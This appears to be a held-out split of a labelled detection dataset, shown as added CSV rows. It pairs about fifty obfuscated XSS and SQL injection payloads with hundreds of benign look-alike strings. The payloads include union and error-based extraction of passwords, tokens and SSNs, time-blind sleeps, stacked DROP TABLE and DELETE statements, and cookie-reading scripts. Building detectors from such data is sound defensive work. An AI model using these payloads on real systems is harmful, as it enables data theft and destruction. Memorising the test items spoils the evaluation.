+<sCrIpT>alert(1)</sCrIpT>,1,xss,reflected,held_out
+"data:text/html,<audio onstart=top['al'+'ert'](1)>",1,xss,dom,held_out
+<audio%09onanimationstart=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
+"' Union%20aLl/**/SELECT/**_**/balance,0x78/**/FROm/**_**/tokens%09-- ",1,sqli,union,held_out
+<iframe onmouseover=alert(1)><!--stored-->,1,xss,stored,held_out
+"<svg
+onanimationstart=alert(1)><!--stored-->",1,xss,stored,held_out
+"""+Or role=0x73656c656374-- 	",1,sqli,hex_obf,held_out
+%27/**_**/Or/**/0x61=0x61/**_**/-- -,1,sqli,boolean_blind,held_out
+"1%0aanD+extractvalue(1,concat(0x7e,(select password/**_**/from%09members%0alimit+1)))%2d%2d ",1,sqli,error,held_out
+"%27/**_**/UnIOn+ALl	SELeCt/**/CHAR(120),0x78,token/**/FRoM%09accounts/**/#",1,sqli,union,held_out
+"""/**/uniOn/*!*/ALL/*!*/selEcT+CHAR(120),name,id,0x78,name+FrOm+staff -- 	",1,sqli,union,held_out
+"data:text/html,<object onpointerover=window['ale'+'rt']`1`>",1,xss,dom,held_out
+<math	onbegin=print()><!--stored-->,1,xss,stored,held_out
+#<object onmouseover=(alert)(1)>,1,xss,dom,held_out
+"data:text/html,<marquee onpointerover=top['al'+'ert'](1)>",1,xss,dom,held_out
+`;+dEleTE+fROm+sessions%20-- ,1,sqli,stacked,held_out
+'%20onpointerover=print()%20',1,xss,attribute,held_out
+"'/*!*/aNd/*!*/(select%09count(*)%09from+products	group%09by%09concat((select/**_**/id%0afrom+orders	limit/**_**/1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
+"""; WaItfor/*!*/Delay/**/'0:0:9'/**_**/-- ",1,sqli,time_blind,held_out
+%27/**_**/OR	SleeP(5)%09#,1,sqli,time_blind,held_out
+#<iframe onpointerover=alert(document.cookie)>,1,xss,dom,held_out
+%27%20Or%207=6/**/-- -,1,sqli,boolean_blind,held_out
+"`%20uNiOn	All/**_**/seLECt%20NULL,NULL+fROM/**_**/tokens	-- -",1,sqli,union,held_out
+"data:text/html,<audio onfocus=eval(atob('YWxlcnQoMSk='))>",1,xss,dom,held_out
+"data:text/html,<marquee onanimationstart=window['ale'+'rt']`1`>",1,xss,dom,held_out
+#<iframe onbegin=(alert)(1)>,1,xss,dom,held_out
+"<svg%09ontoggle=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
+#<svg onload=window['ale'+'rt']`1`>,1,xss,dom,held_out
+"""	anD%09(select%0acount(*)/**/from/*!*/admins/**/group/**/by/*!*/concat((select%0assn+from%20orders%20limit 1),floor(rand(0)*2)))#",1,sqli,error,held_out
+';%09dRop/**/TAble/*!*/tokens -- 	,1,sqli,stacked,held_out
+"""
+onfocus=window['ale'+'rt']`1`
+x=""",1,xss,attribute,held_out
+"data:text/html,<iframe onerror=top['al'+'ert'](1)>",1,xss,dom,held_out
+#<img onload=top['al'+'ert'](1)>,1,xss,dom,held_out
+'%0aOR id=0x756e696f6e-- 	,1,sqli,hex_obf,held_out
+"""	oR+slEeP(5)/**_**/#",1,sqli,time_blind,held_out
+')	oR%097BeTWeEN/**_**/0/**/ANd/**/9	-- ,1,sqli,boolean_blind,held_out
+`;%20upDAtE+users%0aseT/**/ssn=1/**_**/-- -,1,sqli,stacked,held_out
+"%27%20anD (select	count(*)%09from%0aclients group%0aby%09concat((select%09email/**_**/from/*!*/users/**_**/limit	1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
+""";/**_**/dRop/*!*/tablE%0aproducts	%2d%2d ",1,sqli,stacked,held_out
+"""	Or+SleEp(9)%0a-- ",1,sqli,time_blind,held_out
+"'/**/uniON/**_**/all/**/SelECt CHAR(120),token,0x78/*!*/From products/**/-- -",1,sqli,union,held_out
+1%0aor%0a3=5+-- ,1,sqli,boolean_blind,held_out
+')/*!*/or%091bETwEen/**_**/0%09AND%209+-- 	,1,sqli,boolean_blind,held_out
+""";/*!*/UPdAte%09staff	SEt%0assn=1	%2d%2d ",1,sqli,stacked,held_out
+"data:text/html,<iframe onanimationstart=(alert)(1)>",1,xss,dom,held_out
+"1 aND/*!*/extractvalue(1,concat(0x7e,(select/**_**/balance%09from members limit%091)))-- ",1,sqli,error,held_out
+'%09onstart=alert(document.cookie)%09',1,xss,attribute,held_out
+"')/*!*/AnD%0aextractvalue(1,concat(0x7e,(select/**_**/email from%09accounts%0alimit	1)))-- ",1,sqli,error,held_out
+df = df[df['id'] > 33]  # filter,0,benign,benign,held_out
+2026-08-25 13:08 WARN [db] user='u20' path=/api?id=490 retry,0,benign,benign,held_out
+GET /assets/app.js?v=6.5 200 46ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE53 at checkout.,0,benign,benign,held_out
+2026-08-25 10:04 WARN [auth] user='u16' path=/api?id=535 retry,0,benign,benign,held_out
+df = df[df['price'] > 42]  # filter,0,benign,benign,held_out
+GET /assets/app.js?v=2.9 200 26ms,0,benign,benign,held_out
+df = df[df['id'] > 49]  # filter,0,benign,benign,held_out
+if (n%2==0) { return -1; },0,benign,benign,held_out
+GET /assets/app.js?v=7.9 200 18ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE82 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=7.5 200 67ms,0,benign,benign,held_out
+2026-08-25 14:07 WARN [db] user='u54' path=/api?id=69 retry,0,benign,benign,held_out
+"Address: 6 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 21}",0,benign,benign,held_out
+df = df[df['price'] > 35]  # filter,0,benign,benign,held_out
+"{""query"": ""SELECT name FROM contacts"", ""params"": [2], ""safe"": true}",0,benign,benign,held_out
+2026-08-25 10:08 INFO [db] user='u19' path=/api?id=680 retry,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 57}",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE63 at checkout.,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 9}",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 61}",0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 82}",0,benign,benign,held_out
+GET /assets/app.js?v=5.1 200 67ms,0,benign,benign,held_out
+2026-08-25 18:05 INFO [auth] user='u84' path=/api?id=243 retry,0,benign,benign,held_out
+GET /assets/app.js?v=6.9 200 3ms,0,benign,benign,held_out
+"Address: 40 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+"Address: 13 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
+"Address: 95 O'Malley Ave, Apt #5, (near park)",0,benign,benign,held_out
+/products?category=union-suits&sort=name,0,benign,benign,held_out
+"Address: 61 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 5}",0,benign,benign,held_out
+"Address: 82 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
+/search?q=AND/OR%20logic%20review,0,benign,benign,held_out
+GET /assets/app.js?v=2.9 200 62ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE38 at checkout.,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""needs review"", ""qty"": 70}",0,benign,benign,held_out
+"Address: 73 O'Malley Ave, Apt #3, (near park)",0,benign,benign,held_out
+/products?category=select-cuts&sort=price,0,benign,benign,held_out
+"Address: 10 O'Malley Ave, Apt #3, (near park)",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 50}",0,benign,benign,held_out
+2026-08-25 10:07 WARN [db] user='u61' path=/api?id=399 ok,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE29 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=2.1 200 38ms,0,benign,benign,held_out
+2026-08-25 16:07 WARN [http] user='u58' path=/api?id=972 ok,0,benign,benign,held_out
+GET /assets/app.js?v=1.9 200 71ms,0,benign,benign,held_out
+2026-08-25 18:07 INFO [auth] user='u14' path=/api?id=710 ok,0,benign,benign,held_out
+/products?category=books&sort=name,0,benign,benign,held_out
+GET /assets/app.js?v=9.8 200 57ms,0,benign,benign,held_out
+df = df[df['qty'] > 93]  # filter,0,benign,benign,held_out
+df = df[df['qty'] > 89]  # filter,0,benign,benign,held_out
+GET /assets/app.js?v=1.1 200 8ms,0,benign,benign,held_out
+2026-08-25 14:00 WARN [db] user='u68' path=/api?id=714 ok,0,benign,benign,held_out
+df = df[df['price'] > 25]  # filter,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 85}",0,benign,benign,held_out
+df = df[df['price'] > 50]  # filter,0,benign,benign,held_out
+df = df[df['id'] > 94]  # filter,0,benign,benign,held_out
+GET /assets/app.js?v=8.5 200 12ms,0,benign,benign,held_out
+df = df[df['price'] > 76]  # filter,0,benign,benign,held_out
+"Address: 80 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
+"Address: 40 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=4.3 200 29ms,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 3}",0,benign,benign,held_out
+df = df[df['id'] > 69]  # filter,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 37}",0,benign,benign,held_out
+"Address: 25 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
+df = df[df['qty'] > 37]  # filter,0,benign,benign,held_out
+"Address: 50 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=3.5 200 8ms,0,benign,benign,held_out
+/search?q=script%20writing%20best%20price,0,benign,benign,held_out
+GET /assets/app.js?v=1.8 200 99ms,0,benign,benign,held_out
+"Address: 78 O'Malley Ave, Apt #3, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=8.3 200 26ms,0,benign,benign,held_out
+2026-08-25 12:04 INFO [db] user='u18' path=/api?id=783 ok,0,benign,benign,held_out
+df = df[df['id'] > 1]  # filter,0,benign,benign,held_out
+/search?q=invoice%20near%20me,0,benign,benign,held_out
+2026-08-25 11:03 INFO [db] user='u47' path=/api?id=636 200,0,benign,benign,held_out
+df = df[df['id'] > 27]  # filter,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE36 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=4.4 200 80ms,0,benign,benign,held_out
+"Address: 48 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 2}",0,benign,benign,held_out
+"Address: 58 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
+df = df[df['qty'] > 67]  # filter,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 65}",0,benign,benign,held_out
+/search?q=1%3D1%20meme%20review,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 20}",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE60 at checkout.,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 3}",0,benign,benign,held_out
+GET /assets/app.js?v=3.9 200 76ms,0,benign,benign,held_out
+"Address: 46 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 1}",0,benign,benign,held_out
+2026-08-25 10:07 WARN [auth] user='u92' path=/api?id=448 200,0,benign,benign,held_out
+2026-08-25 17:07 INFO [db] user='u58' path=/api?id=814 200,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 35}",0,benign,benign,held_out
+df = df[df['price'] > 95]  # filter,0,benign,benign,held_out
+df = df[df['price'] > 20]  # filter,0,benign,benign,held_out
+/products?category=union-suits&sort=price,0,benign,benign,held_out
+GET /assets/app.js?v=1.1 200 11ms,0,benign,benign,held_out
+GET /assets/app.js?v=6.9 200 25ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE81 at checkout.,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE51 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=8.2 200 61ms,0,benign,benign,held_out
+2026-08-25 15:02 INFO [db] user='u69' path=/api?id=165 retry,0,benign,benign,held_out
+/search?q=order%20by%20phone%20best%20price,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 3}",0,benign,benign,held_out
+df = df[df['id'] > 3]  # filter,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 53}",0,benign,benign,held_out
+"Address: 77 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
+if (x!=y) { return true; },0,benign,benign,held_out
+2026-08-25 15:05 WARN [http] user='u96' path=/api?id=989 ok,0,benign,benign,held_out
+2026-08-25 18:04 INFO [db] user='u96' path=/api?id=105 ok,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE43 at checkout.,0,benign,benign,held_out
+/search?q=drop%20shipping%20best%20price,0,benign,benign,held_out
+2026-08-25 14:06 WARN [auth] user='u72' path=/api?id=148 ok,0,benign,benign,held_out
+if (x!=y) { return -1; },0,benign,benign,held_out
+"Team, the SELECT committee will review 5+ vendors where cost < budget.",0,benign,benign,held_out
+df = df[df['id'] > 83]  # filter,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE70 at checkout.,0,benign,benign,held_out
+grep -rn 'FIXME' src/ | wc -l,0,benign,benign,held_out
+/search?q=red%20%26%20blue%202024,0,benign,benign,held_out
+df = df[df['qty'] > 29]  # filter,0,benign,benign,held_out
+"Address: 61 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+df = df[df['price'] > 63]  # filter,0,benign,benign,held_out
+df = df[df['price'] > 15]  # filter,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE16 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=5.0 200 10ms,0,benign,benign,held_out
+2026-08-25 15:00 WARN [http] user='u21' path=/api?id=561 200,0,benign,benign,held_out
+GET /assets/app.js?v=2.4 200 56ms,0,benign,benign,held_out
+GET /assets/app.js?v=1.2 200 55ms,0,benign,benign,held_out
+/search?q=drop%20shipping%20review,0,benign,benign,held_out
+GET /assets/app.js?v=4.6 200 41ms,0,benign,benign,held_out
+GET /assets/app.js?v=1.6 200 6ms,0,benign,benign,held_out
+/search?q=red%20%26%20blue%20best%20price,0,benign,benign,held_out
+"Address: 11 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+/products?category=select-cuts&sort=name,0,benign,benign,held_out
+GET /assets/app.js?v=4.0 200 74ms,0,benign,benign,held_out
+GET /assets/app.js?v=8.9 200 57ms,0,benign,benign,held_out
+/api/v2/users?filter=id%3E100,0,benign,benign,held_out
+GET /assets/app.js?v=3.4 200 6ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE90 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=1.8 200 39ms,0,benign,benign,held_out
+/search?q=admin%20panel%20guide%20near%20me,0,benign,benign,held_out
+"Address: 72 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
+df = df[df['qty'] > 16]  # filter,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE19 at checkout.,0,benign,benign,held_out
+2026-08-25 11:08 INFO [http] user='u83' path=/api?id=670 ok,0,benign,benign,held_out
+GET /assets/app.js?v=7.5 200 29ms,0,benign,benign,held_out
+/api/v2/users?filter=role%20in%20%28admin%2Cuser%29,0,benign,benign,held_out
+df = df[df['qty'] > 28]  # filter,0,benign,benign,held_out
+"Address: 42 O'Malley Ave, Apt #7, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=5.7 200 69ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE66 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=5.1 200 61ms,0,benign,benign,held_out
+2026-08-25 17:09 WARN [auth] user='u36' path=/api?id=48 200,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 8}",0,benign,benign,held_out
+GET /assets/app.js?v=4.0 200 97ms,0,benign,benign,held_out
+df = df[df['id'] > 36]  # filter,0,benign,benign,held_out
+"Address: 35 O'Malley Ave, Apt #9, (near park)",0,benign,benign,held_out
+"Address: 78 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
+df = df[df['price'] > 59]  # filter,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 56}",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 33}",0,benign,benign,held_out
+"{""query"": ""SELECT name FROM contacts"", ""params"": [4], ""safe"": true}",0,benign,benign,held_out
+GET /assets/app.js?v=8.9 200 8ms,0,benign,benign,held_out
+GET /assets/app.js?v=4.3 200 44ms,0,benign,benign,held_out
+GET /assets/app.js?v=6.3 200 32ms,0,benign,benign,held_out
+GET /assets/app.js?v=9.6 200 22ms,0,benign,benign,held_out
+GET /assets/app.js?v=6.5 200 26ms,0,benign,benign,held_out
+GET /assets/app.js?v=2.6 200 18ms,0,benign,benign,held_out
+2026-08-25 12:07 WARN [http] user='u79' path=/api?id=53 retry,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 81}",0,benign,benign,held_out
+2026-08-25 11:01 WARN [http] user='u57' path=/api?id=275 200,0,benign,benign,held_out
+if (a==b) { return true; },0,benign,benign,held_out
+/search?q=union%20station%20best%20price,0,benign,benign,held_out
+GET /assets/app.js?v=4.6 200 82ms,0,benign,benign,held_out
+"Address: 93 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
+2026-08-25 15:07 INFO [db] user='u51' path=/api?id=802 200,0,benign,benign,held_out
+"Address: 71 O'Malley Ave, Apt #5, (near park)",0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 97}",0,benign,benign,held_out
+GET /assets/app.js?v=8.5 200 84ms,0,benign,benign,held_out
+2026-08-25 15:01 WARN [db] user='u97' path=/api?id=118 ok,0,benign,benign,held_out
+2026-08-25 10:02 INFO [http] user='u92' path=/api?id=376 200,0,benign,benign,held_out
+"Address: 24 O'Malley Ave, Apt #7, (near park)",0,benign,benign,held_out
+"Address: 20 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE20 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=6.5 200 82ms,0,benign,benign,held_out
+GET /assets/app.js?v=5.7 200 60ms,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 18}",0,benign,benign,held_out
+const url = `https://api.x.io/v1/users?limit=${n}`;,0,benign,benign,held_out
+if (x!=y) { return null; },0,benign,benign,held_out
+GET /assets/app.js?v=4.4 200 15ms,0,benign,benign,held_out
+/search?q=invoice%202024,0,benign,benign,held_out
+2026-08-25 16:07 WARN [db] user='u21' path=/api?id=294 200,0,benign,benign,held_out
+"Address: 96 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE77 at checkout.,0,benign,benign,held_out
+"{""query"": ""SELECT name FROM contacts"", ""params"": [6], ""safe"": true}",0,benign,benign,held_out
+2026-08-25 18:04 INFO [db] user='u28' path=/api?id=392 retry,0,benign,benign,held_out
+df = df[df['id'] > 75]  # filter,0,benign,benign,held_out
+2026-08-25 15:01 INFO [http] user='u19' path=/api?id=146 200,0,benign,benign,held_out
+"Address: 12 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE93 at checkout.,0,benign,benign,held_out
+"Address: 91 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
+df = df[df['qty'] > 6]  # filter,0,benign,benign,held_out
+"{""query"": ""SELECT name FROM contacts"", ""params"": [7], ""safe"": true}",0,benign,benign,held_out
+2026-08-25 10:06 WARN [http] user='u22' path=/api?id=379 ok,0,benign,benign,held_out
+/search?q=script%20writing%202024,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 48}",0,benign,benign,held_out
+GET /assets/app.js?v=4.3 200 31ms,0,benign,benign,held_out
+"Address: 88 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 47}",0,benign,benign,held_out
+"Address: 79 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
+df = df[df['price'] > 88]  # filter,0,benign,benign,held_out
+if (n%2==0) { return true; },0,benign,benign,held_out
+"Address: 52 O'Malley Ave, Apt #5, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=8.1 200 8ms,0,benign,benign,held_out
+"awk -F',' '{print $4}' data.csv",0,benign,benign,held_out
+df = df[df['price'] > 53]  # filter,0,benign,benign,held_out
+2026-08-25 17:02 INFO [http] user='u76' path=/api?id=351 ok,0,benign,benign,held_out
+2026-08-25 15:08 INFO [db] user='u1' path=/api?id=505 ok,0,benign,benign,held_out
+df = df[df['qty'] > 88]  # filter,0,benign,benign,held_out
+"Address: 76 O'Malley Ave, Apt #9, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=6.3 200 43ms,0,benign,benign,held_out
+if (a==b) { return -1; },0,benign,benign,held_out
+df = df[df['id'] > 72]  # filter,0,benign,benign,held_out
+GET /assets/app.js?v=9.7 200 5ms,0,benign,benign,held_out
+"Address: 45 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""needs review"", ""qty"": 85}",0,benign,benign,held_out
+"Address: 41 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
+"Address: 39 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 10}",0,benign,benign,held_out
+"Address: 99 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
+"Address: 81 O'Malley Ave, Apt #2, (near park)",0,benign,benign,held_out
+"Address: 87 O'Malley Ave, Apt #7, (near park)",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE54 at checkout.,0,benign,benign,held_out
+2026-08-25 16:00 INFO [http] user='u53' path=/api?id=762 retry,0,benign,benign,held_out
+/search?q=invoice%20review,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 49}",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE62 at checkout.,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 46}",0,benign,benign,held_out
+df = df[df['price'] > 67]  # filter,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 1}",0,benign,benign,held_out
+/search?q=select%20size%20best%20price,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE98 at checkout.,0,benign,benign,held_out
+df = df[df['id'] > 21]  # filter,0,benign,benign,held_out
+df = df[df['id'] > 23]  # filter,0,benign,benign,held_out
+/search?q=drop%20shipping%202024,0,benign,benign,held_out
+"Address: 20 O'Malley Ave, Apt #1, (near park)",0,benign,benign,held_out
+"Address: 25 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
+df = df[df['qty'] > 4]  # filter,0,benign,benign,held_out
+"Address: 39 O'Malley Ave, Apt #5, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=4.6 200 95ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE79 at checkout.,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""needs review"", ""qty"": 90}",0,benign,benign,held_out
+df = df[df['qty'] > 71]  # filter,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE85 at checkout.,0,benign,benign,held_out
+df = df[df['qty'] > 1]  # filter,0,benign,benign,held_out
+"Address: 59 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+"Address: 59 O'Malley Ave, Apt #3, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=5.4 200 93ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE10 at checkout.,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 28}",0,benign,benign,held_out
+"Address: 1 O'Malley Ave, Apt #5, (near park)",0,benign,benign,held_out
+df = df[df['price'] > 52]  # filter,0,benign,benign,held_out
+"Address: 60 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE39 at checkout.,0,benign,benign,held_out
+/search?q=red%20%26%20blue%20near%20me,0,benign,benign,held_out
+"Address: 34 O'Malley Ave, Apt #7, (near park)",0,benign,benign,held_out
+df = df[df['id'] > 97]  # filter,0,benign,benign,held_out
+GET /assets/app.js?v=6.7 200 19ms,0,benign,benign,held_out
+GET /assets/app.js?v=7.6 200 91ms,0,benign,benign,held_out
+GET /assets/app.js?v=3.2 200 19ms,0,benign,benign,held_out
+"Address: 81 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=2.6 200 32ms,0,benign,benign,held_out
+2026-08-25 19:03 WARN [db] user='u46' path=/api?id=794 ok,0,benign,benign,held_out
+"awk -F',' '{print $5}' data.csv",0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""<3 the team"", ""qty"": 66}",0,benign,benign,held_out
+"{""query"": ""SELECT name FROM contacts"", ""params"": [5], ""safe"": true}",0,benign,benign,held_out
+SELECT name FROM users WHERE id = %s  -- parameterised,0,benign,benign,held_out
+2026-08-25 14:03 WARN [db] user='u96' path=/api?id=346 retry,0,benign,benign,held_out
+"Address: 9 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""1 < 2 && ok"", ""qty"": 59}",0,benign,benign,held_out
+df = df[df['price'] > 16]  # filter,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""needs review"", ""qty"": 79}",0,benign,benign,held_out
+2026-08-25 18:05 WARN [auth] user='u52' path=/api?id=948 retry,0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 26}",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE86 at checkout.,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE67 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=9.5 200 50ms,0,benign,benign,held_out
+"Address: 34 O'Malley Ave, Apt #5, (near park)",0,benign,benign,held_out
+"{""user"": ""alice"", ""note"": ""<3 the team"", ""qty"": 33}",0,benign,benign,held_out
+2026-08-25 12:03 WARN [db] user='u92' path=/api?id=367 retry,0,benign,benign,held_out
+df = df[df['price'] > 11]  # filter,0,benign,benign,held_out
+grep -rn 'select' src/ | wc -l,0,benign,benign,held_out
+df = df[df['price'] > 28]  # filter,0,benign,benign,held_out
+"Address: 86 O'Malley Ave, Apt #9, (near park)",0,benign,benign,held_out
+GET /assets/app.js?v=7.7 200 97ms,0,benign,benign,held_out
+2026-08-25 11:07 INFO [db] user='u44' path=/api?id=817 200,0,benign,benign,held_out
+df = df[df['qty'] > 36]  # filter,0,benign,benign,held_out
+df = df[df['qty'] > 8]  # filter,0,benign,benign,held_out
+df = df[df['qty'] > 25]  # filter,0,benign,benign,held_out
+GET /assets/app.js?v=9.5 200 27ms,0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE12 at checkout.,0,benign,benign,held_out
+GET /assets/app.js?v=9.6 200 55ms,0,benign,benign,held_out
+"Address: 42 O'Malley Ave, Apt #8, (near park)",0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 39}",0,benign,benign,held_out
+GET /assets/app.js?v=3.9 200 48ms,0,benign,benign,held_out
+df = df[df['price'] > 60]  # filter,0,benign,benign,held_out
+"{""user"": ""o'connor"", ""note"": ""1 < 2 && ok"", ""qty"": 61}",0,benign,benign,held_out
+Discount: buy 2 & save 10%; use code SAVE14 at checkout.,0,benign,benign,held_out
+"Address: 5 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
+df = df[df['qty'] > 19]  # filter,0,benign,benign,held_out
+GET /assets/app.js?v=3.1 200 90ms,0,benign,benign,held_out
+2026-08-25 11:06 INFO [auth] user='u86' path=/api?id=131 200,0,benign,benign,held_out
+GET /assets/app.js?v=7.9 200 10ms,0,benign,benign,held_out
+df = df[df['id'] > 43]  # filter,0,benign,benign,held_out
+/search?q=1%3D1%20meme%202024,0,benign,benign,held_out
+"Address: 38 O'Malley Ave, Apt #5, (near park)",0,benign,benign,held_out
+df = df[df['id'] > 12]  # filter,0,benign,benign,held_out
+/products?category=drop-crotch&sort=price,0,benign,benign,held_out
+df = df[df['qty'] > 98]  # filter,0,benign,benign,held_out
+df = df[df['qty'] > 5]  # filter,0,benign,benign,held_out
+"Address: 26 O'Malley Ave, Apt #6, (near park)",0,benign,benign,held_out
+2026-08-25 10:06 WARN [auth] user='u23' path=/api?id=78 retry,0,benign,benign,held_out
+GET /assets/app.js?v=3.1 200 99ms,0,benign,benign,held_out
+"Address: 10 O'Malley Ave, Apt #4, (near park)",0,benign,benign,held_out
